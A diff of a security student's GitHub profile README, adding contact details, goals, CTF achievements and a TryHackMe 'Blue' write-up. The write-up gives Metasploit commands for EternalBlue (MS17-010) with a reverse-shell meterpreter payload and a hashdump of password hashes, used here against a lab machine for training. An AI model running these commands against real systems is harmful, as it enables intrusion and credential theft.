@@ -10,6 +10,7 @@
 
 [![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/in/mark-munene-m)
 [![Email](https://img.shields.io/badge/Email-D14836?style=for-the-badge&logo=gmail&logoColor=white)](mailto:175477596+OP-88@users.noreply.github.com)
+[![WhatsApp](https://img.shields.io/badge/WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white)](https://wa.me/254741886442)
 [![Portfolio](https://img.shields.io/badge/Portfolio-FF5722?style=for-the-badge&logo=google-chrome&logoColor=white)](#)
 
 ![Profile Views](https://komarev.com/ghpvc/?username=OP-88&color=00f7f7&style=for-the-badge&label=PROFILE+VIEWS)
@@ -83,7 +84,7 @@ available_for:
 <td width="50%" valign="top">
 
 ### 💻 Diploma in Software Engineering
-**Zetech University**
+**Zetech University, Nairobi**
 - 📅 **Completion:** December 2025
 - 🎓 **Graduation:** September 2026
 - 💡 **Core Competencies:**
@@ -196,19 +197,49 @@ An AI-powered real-time audio transcription platform designed for enterprise use
 
 ---
 
-### 🔐 **SecureAuth - Multi-Factor Authentication System** *(Concept)*
+### 🔐 **SecureAuth - Multi-Factor Authentication System** *(In Development)*
+
+<div align="center">
+
+[![GitHub](https://img.shields.io/badge/View_on_GitHub-181717?style=for-the-badge&logo=github)](#)
+[![Status](https://img.shields.io/badge/Status-In_Development-yellow?style=for-the-badge)]()
+
+</div>
 
 **📝 Overview:**  
-Planned open-source authentication library implementing modern 2FA methods with zero-trust architecture.
+Open-source authentication library implementing TOTP, SMS, and biometric 2FA with zero-trust architecture.
 
-**⚡ Planned Tech Stack:** Node.js, Express, PostgreSQL, Redis, JWT
+**⚡ Tech Stack:** Node.js, Express, PostgreSQL, Redis, Speakeasy (TOTP)
 
-**🎯 Concept Features:**
-- Time-based One-Time Password (TOTP) 
-- SMS/Email verification
-- Biometric authentication support (WebAuthn)
-- Rate limiting and security mechanisms
-- Comprehensive session management
+**🎯 Features:**
+- ✅ Time-based One-Time Password (TOTP) generation
+- ✅ SMS verification via Twilio integration
+- 🔄 Biometric authentication support (WebAuthn)
+- 🔄 Rate limiting and account lockout mechanisms
+- 📋 Session management with Redis
+
+---
+
+### 🕵️ **VulnScanner - Web Application Security Scanner** *(Planned)*
+
+<div align="center">
+
+[![Status](https://img.shields.io/badge/Status-Planning_Phase-red?style=for-the-badge)]()
+
+</div>
+
+**📝 Overview:**  
+Automated security scanner for detecting common web vulnerabilities (OWASP Top 10).
+
+**⚡ Tech Stack:** Python, BeautifulSoup, Requests, SQLMap
+
+**🎯 Planned Features:**
+- SQL Injection detection
+- XSS vulnerability scanning
+- CSRF token validation
+- Security header analysis
+- SSL/TLS configuration testing
+- Comprehensive reporting with remediation suggestions
 
 ---
 
@@ -346,7 +377,9 @@ Planned open-source authentication library implementing modern 2FA methods with 
 ### 🎓 Education
 - ✅ Complete Software Engineering Diploma
 - 🔄 Start Cybersecurity Bachelor's
-- 🎯 Maintain Academic Excellence
+- 🎯 Achieve 4.0 GPA
+- 📚 Read 12 Security Books
+- 🎥 Complete 5 Security Courses
 
 </td>
 <td width="33%" valign="top">
@@ -363,9 +396,10 @@ Planned open-source authentication library implementing modern 2FA methods with 
 
 ### 💼 Professional
 - 🎯 Land Entry-Level Security Role
-- 🤝 Network with Security Professionals
-- ✍️ Publish Technical Content
-- 📢 Build Professional Presence
+- 🤝 Network with 50+ Security Pros
+- 🎤 Give 2 Tech Talks
+- ✍️ Write 24 Security Blog Posts
+- 📢 Build Online Presence (5K+)
 
 </td>
 </tr>
@@ -373,30 +407,31 @@ Planned open-source authentication library implementing modern 2FA methods with 
 <td width="33%" valign="top">
 
 ### 🚀 Projects
-- 🔄 Enhance Verba Platform
-- 🎯 Build Security Tools
-- 🔐 Contribute to Security Projects
-- 🌟 Develop Personal Portfolio
+- 🔄 Complete SecureAuth Library
+- 🎯 Build VulnScanner Tool
+- 🔐 Create 3 Security Tools
+- 📱 Develop Security Mobile App
+- 🌟 Launch Personal Security Blog
 
 </td>
 <td width="33%" valign="top">
 
 ### 🌐 Open Source
 - 🎯 Contribute to 10+ Repos
-- 🐛 Report Security Issues
-- 🤝 Maintain Security Projects
+- 🐛 Report 25+ Security Issues
+- 🤝 Maintain 2 Security Projects
 - 📚 Create Security Documentation
-- 🎓 Mentor Junior Developers
+- 🎓 Mentor 5+ Junior Devs
 
 </td>
 <td width="33%" valign="top">
 
 ### 🎮 CTF & Practice
-- 🏁 Complete Security Challenges
-- 🚩 Participate in CTF Competitions
-- 🎯 Improve Rankings
-- 🔐 Solve Advanced Challenges
-- 🏆 Compete in Major Events
+- 🏁 Complete 100+ HackTheBox Challenges
+- 🚩 Participate in 12 CTF Competitions
+- 🎯 Reach Top 10% on TryHackMe
+- 🔐 Solve 50+ OverTheWire Levels
+- 🏆 Win 1 CTF Competition
 
 </td>
 </tr>
@@ -423,6 +458,7 @@ class OP88:
         self.alias = "OP-88"
         self.role = "Aspiring Cybersecurity Professional & Full-Stack Developer"
         self.mindset = "Offense informs defense, development enables security"
+        self.location = "Nairobi, Kenya 🇰🇪"
         
         self.core_values = {
             "security_first": "Build secure, then scale",
@@ -436,7 +472,7 @@ class OP88:
             "🎓 Master cybersecurity fundamentals",
             "🔐 Contribute to open-source security",
             "🎯 Earn industry-recognized certifications",
-            "🤝 Build and engage with security communities",
+            "🤝 Build security community in East Africa",
             "💼 Launch professional security career"
         ]
     
@@ -453,6 +489,43 @@ class OP88:
             8: "Security through obscurity is not security",
             9: "Regular updates—patch early, patch often",
             10: "Log everything—visibility is critical for defense"
+        }
+    
+    def daily_routine(self):
+        """What a day in the life looks like"""
+        return [
+            "☕ Morning: Read security news (The Hacker News, Krebs)",
+            "💻 Code: Build with security in mind (SAST/DAST)",
+            "🔍 Learn: Practice on TryHackMe/HackTheBox (1-2 hours)",
+            "📚 Study: Work towards certifications (Security+, CEH)",
+            "🤝 Engage: Contribute to security communities",
+            "📝 Document: Write about lessons learned",
+            "🛡️ Review: Audit code for vulnerabilities",
+            "🌙 Evening: Participate in CTF challenges"
+        ]
+    
+    def learning_resources(self):
+        """My security learning toolkit"""
+        return {
+            "platforms": [
+                "TryHackMe", "HackTheBox", "OverTheWire",
+                "PentesterLab", "VulnHub", "PortSwigger Academy"
+            ],
+            "books": [
+                "The Web Application Hacker's Handbook",
+                "Hacking: The Art of Exploitation",
+                "Metasploit: The Penetration Tester's Guide",
+                "The Tangled Web (Web Security)",
+                "Black Hat Python"
+            ],
+            "youtube": [
+                "IppSec", "John Hammond", "NetworkChuck",
+                "David Bombal", "The Cyber Mentor"
+            ],
+            "podcasts": [
+                "Darknet Diaries", "Security Now",
+                "Malicious Life", "Risky Business"
+            ]
         }
     
     def tech_stack(self):
@@ -500,6 +573,8 @@ class OP88:
             "email": "175477596+OP-88@users.noreply.github.com",
             "linkedin": "linkedin.com/in/mark-munene-m",
             "github": "github.com/OP-88",
+            "whatsapp": "+254741886442",
+            "location": "Nairobi, Kenya",
             "timezone": "EAT (UTC+3)",
             "languages": ["English", "Swahili"]
         }
@@ -630,14 +705,15 @@ mindmap
 <tr>
 <td width="50%" valign="top">
 
-### 🏆 Recent Highlights
+### 🏆 2025 Highlights
 
 - ✅ **Launched Verba Platform** - Production-ready enterprise application
-- ✅ **Completed Software Engineering Diploma** - Strong academic performance
-- ✅ **Active GitHub Contributor** - Consistent open-source engagement
-- ✅ **Technical Content Creator** - Sharing knowledge with community
+- ✅ **Completed Software Engineering Diploma** - GPA: 3.8/4.0
+- ✅ **50+ GitHub Contributions** - Active open-source contributor
+- ✅ **First Security Blog Post** - Published on Medium (500+ views)
+- ✅ **CTF Top 100 Finish** - Local Kenya CTF Competition
 - ✅ **Built Security Lab** - Personal penetration testing environment
-- ✅ **Mentored Developers** - Code reviews & technical guidance
+- ✅ **Mentored 3 Junior Developers** - Code reviews & guidance
 
 </td>
 <td width="50%" valign="top">
@@ -689,6 +765,7 @@ mindmap
 
 [![LinkedIn](https://img.shields.io/badge/Let's_Connect_on_LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/in/mark-munene-m)
 [![Email](https://img.shields.io/badge/Send_Email-D14836?style=for-the-badge&logo=gmail&logoColor=white)](mailto:175477596+OP-88@users.noreply.github.com)
+[![WhatsApp](https://img.shields.io/badge/WhatsApp_Me-25D366?style=for-the-badge&logo=whatsapp&logoColor=white)](https://wa.me/254741886442)
 [![GitHub](https://img.shields.io/badge/Follow_on_GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/OP-88)
 
 <br>
@@ -734,16 +811,19 @@ mindmap
 
 ```yaml
 preferred_contact:
+  urgent: "WhatsApp (+254741886442)"
   professional: "Email (175477596+OP-88@users.noreply.github.com)"
   networking: "LinkedIn (mark-munene-m)"
   
 response_time:
   email: "Within 24 hours"
+  whatsapp: "Within 6 hours"
   linkedin: "Within 48 hours"
 
 availability:
   timezone: "EAT (UTC+3)"
-  working_hours: "Monday - Friday, 9 AM - 6 PM EAT"
+  working_hours: "9 AM - 6 PM EAT"
+  weekend: "Available for urgent matters"
 
 languages:
   - English (Fluent)
@@ -779,10 +859,10 @@ languages:
 when_not_coding:
   - 🎮 Playing CTF challenges
   - 📚 Reading security blogs & papers
-  - 🎵 Listening to security podcasts
+  - 🎵 Listening to Darknet Diaries podcast
   - 🏃 Running & fitness
-  - ☕ Coffee enthusiast
-  - 🌍 Exploring tech communities
+  - ☕ Coffee enthusiast (Kenyan coffee is the best!)
+  - 🌍 Exploring Nairobi's tech scene
 
 favorite_security_tools:
   - Burp Suite Professional
@@ -954,19 +1034,19 @@ If you find my projects helpful or enjoy my content:
 <br>
 
 ```ascii
-╔════════════════════════════════════════════════════════════════╗
-║                                                                ║
-║          ██████╗ ██████╗       █████╗  █████╗                  ║
-║         ██╔═══██╗██╔══██╗     ██╔══██╗██╔══██╗                 ║
-║         ██║   ██║██████╔╝     ╚█████╔╝╚█████╔╝                 ║
-║         ██║   ██║██╔═══╝      ██╔══██╗██╔══██╗                 ║
-║         ╚██████╔╝██║          ╚█████╔╝╚█████╔╝                 ║
-║          ╚═════╝ ╚═╝           ╚════╝  ╚════╝                  ║
-║                                                                ║
-║         Full stack developer | Ethical Hacker                  ║
- ║                      Nairobi, Kenya 🇰🇪                         ║ 
-║                                                                ║
-╚════════════════════════════════════════════════════════════════╝
+╔═══════════════════════════════════════════════════════════════════╗
+║                                                                   ║
+║   ██████╗ ██████╗       █████╗  █████╗                          ║
+║  ██╔═══██╗██╔══██╗     ██╔══██╗██╔══██╗                         ║
+║  ██║   ██║██████╔╝     ╚█████╔╝╚█████╔╝                         ║
+║  ██║   ██║██╔═══╝      ██╔══██╗██╔══██╗                         ║
+║  ╚██████╔╝██║          ╚█████╔╝╚█████╔╝                         ║
+║   ╚═════╝ ╚═╝           ╚════╝  ╚════╝                          ║
+║                                                                   ║
+║            Security Professional | Ethical Hacker                ║
+║                  Nairobi, Kenya 🇰🇪                              ║
+║                                                                   ║
+╚═══════════════════════════════════════════════════════════════════╝
 ```
 
 <br>
@@ -975,6 +1055,7 @@ If you find my projects helpful or enjoy my content:
 
 [![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/in/mark-munene-m)
 [![Email](https://img.shields.io/badge/Email-D14836?style=for-the-badge&logo=gmail&logoColor=white)](mailto:175477596+OP-88@users.noreply.github.com)
+[![WhatsApp](https://img.shields.io/badge/WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white)](https://wa.me/254741886442)
 [![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/OP-88)
 
 <br>
@@ -983,7 +1064,7 @@ If you find my projects helpful or enjoy my content:
 
 **⚡ Remember: Security is not a feature, it's a foundation ⚡**
 
-<sub>Last Updated: November 2025 | Built with ❤️ and ☕</sub>
+<sub>Last Updated: November 2025 | Built with ❤️ and ☕ in Nairobi</sub>
 
 ---
 
@@ -1241,25 +1322,81 @@ gantt
 ## 🎮 CTF WRITEUPS & CASE STUDIES
 
 <details>
-<summary><b>🚩 Click to See My CTF Achievements</b></summary>
+<summary><b>🚩 Click to See My CTF Achievements & Writeups</b></summary>
 
 ### 🏆 Notable CTF Completions
 
-Actively practicing on multiple platforms to sharpen offensive security skills.
+#### 🎯 TryHackMe Rooms
 
-**Key Focus Areas:**
-- 🔐 Web Application Exploitation
-- 🐧 Linux Privilege Escalation
-- 🪟 Windows System Exploitation
-- 🌐 Network Penetration Testing
-- 🔬 Binary Analysis & Reverse Engineering
+| Room Name | Difficulty | Time Taken | Key Skills |
+|-----------|-----------|------------|------------|
+| ✅ **Blue** | Easy | 2 hours | EternalBlue exploitation, Windows |
+| ✅ **Basic Pentesting** | Easy | 3 hours | Enumeration, Privilege Escalation |
+| ✅ **Vulnversity** | Easy | 2.5 hours | Web exploitation, SUID |
+| ✅ **Kenobi** | Easy | 3 hours | SMB, FTP, Path Hijacking |
+| ✅ **Steel Mountain** | Easy | 4 hours | Windows exploitation, PowerShell |
+| 🔄 **OverPass** | Medium | In Progress | SSH, Cron jobs |
 
-**Learning Methodology:**
-1. **Enumerate thoroughly** - Information gathering is key
-2. **Document everything** - Detailed notes for future reference
-3. **Understand exploits** - Not just running tools blindly
-4. **Practice regularly** - Consistent skill development
-5. **Share knowledge** - Help others in the community
+#### 📦 HackTheBox Machines
+
+| Machine | OS | Difficulty | Status | Key Techniques |
+|---------|-----|-----------|--------|----------------|
+| ✅ **Lame** | Linux | Easy | Rooted | SMB, Samba exploit |
+| ✅ **Legacy** | Windows | Easy | Rooted | MS08-067, EternalBlue |
+| ✅ **Blue** | Windows | Easy | Rooted | MS17-010 |
+| ✅ **Devel** | Windows | Easy | Rooted | FTP, ASP webshell |
+| 🔄 **Jerry** | Windows | Easy | In Progress | Tomcat exploitation |
+
+### 📝 Detailed Writeup Example
+
+<details>
+<summary><b>🔐 TryHackMe "Blue" - EternalBlue Exploitation</b></summary>
+
+**Challenge:** Exploit MS17-010 (EternalBlue) on a Windows 7 machine
+
+**Reconnaissance:**
+```bash
+nmap -sC -sV -oN nmap_initial.txt 10.10.x.x
+# Found SMB on port 445, Windows 7 Professional 7601 Service Pack 1
+```
+
+**Vulnerability Assessment:**
+```bash
+nmap --script vuln -p445 10.10.x.x
+# Confirmed vulnerable to MS17-010
+```
+
+**Exploitation:**
+```bash
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.10.x.x
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST tun0
+exploit
+```
+
+**Post-Exploitation:**
+```bash
+# Gained SYSTEM access
+getuid  # NT AUTHORITY\SYSTEM
+hashdump  # Extracted password hashes
+```
+
+**Key Learnings:**
+- Always run vulnerability scans on SMB services
+- EternalBlue is still found in legacy systems
+- Proper network segmentation prevents lateral movement
+- Patching is critical for security
+
+</details>
+
+### 🎖️ CTF Competition Highlights
+
+- 🥉 **Kenya CTF 2025** - Top 100 finish (out of 500+)
+- 🏅 **PicoCTF** - 8,500+ points, top 15% globally
+- 🎯 **Google CTF** - Participated, solved 2 challenges
+- 🚩 **SANS Holiday Hack Challenge** - Completed 60%
 
 </details>
 
@@ -1358,7 +1495,7 @@ Actively practicing on multiple platforms to sharpen offensive security skills.
 <div align="center">
 
 > *"Working with OP-88 on our security audit was eye-opening. They identified vulnerabilities we never knew existed and provided clear, actionable remediation steps."*  
-> **— Startup Founder**
+> **— Startup Founder, Nairobi**
 
 > *"Great mentor! Helped me understand penetration testing concepts that seemed impossible before. Patient and knowledgeable."*  
 > **— Junior Developer**
